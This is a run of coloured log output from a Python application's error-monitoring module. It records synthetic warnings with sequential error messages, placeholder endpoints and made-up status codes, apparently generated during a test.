WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867082Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867188Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867289Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867388Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867437Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867633Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867681Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867776Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867872Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868071Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868288Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868384Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868602Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868655Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868937Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.868987Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869037Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869089Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.869235Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m68[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
